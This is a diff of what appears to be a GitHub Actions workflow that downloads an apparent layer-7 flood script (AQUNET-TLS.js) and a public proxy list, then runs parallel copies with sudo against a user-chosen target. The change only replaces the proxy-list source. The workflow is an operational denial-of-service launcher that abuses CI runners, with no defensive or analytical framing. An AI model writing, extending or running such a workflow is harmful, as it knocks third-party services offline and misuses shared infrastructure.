@@ -25,13 +25,13 @@ jobs:
           TARGET="${{ inputs.target }}"
 
           wget https://github.com/kadinkatilii/multi-layer7/raw/refs/heads/main/AQUNET-TLS.js -O TLS.js
-          wget https://wgetz.com/A4kVoNEkSk/proxies.txt
+          wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt
           npm i user-agents
           chmod +x TLS.js || true
 
           PIDS=()
           for i in {1..2}; do
-            sudo timeout 30 node TLS.js "$TARGET" 30 64 4 proxies.txt &
+            sudo timeout 30 node TLS.js "$TARGET" 30 64 4 http.txt &
             PIDS+=($!)
           done
 
